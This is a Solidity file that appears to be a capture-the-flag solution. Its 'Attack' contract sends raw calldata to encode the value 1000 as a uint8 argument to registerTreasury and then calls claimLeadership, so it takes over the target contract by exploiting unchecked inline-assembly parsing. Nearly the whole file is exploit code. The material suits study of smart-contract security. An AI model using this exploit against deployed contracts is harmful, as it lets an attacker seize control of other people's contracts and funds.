// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Solution:
We use a low-level call with abi.encodeWithSignature instead of directly calling registerTreasury(uint8) 
because Solidity enforces type safety and uint8 strictly allows values between 0 and 255. However, 
we want to bypass this restriction and pass a value greater than 255 (like 1000) into the function.

By using low-level call, we avoid the compiler's type checks and directly control the calldata, 
which is exactly what the inline assembly inside the registerTreasury function uses.
*/

interface IHigherOrder {
    function claimLeadership() external;
}

contract Attack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {

        bytes memory data = abi.encodeWithSignature("registerTreasury(uint8)", 1000);
        (bool success, ) = target.call(data);
        require(success, "Call failed");
    }

    function claimLeadership() public {
        IHigherOrder(target).claimLeadership();
    }
}

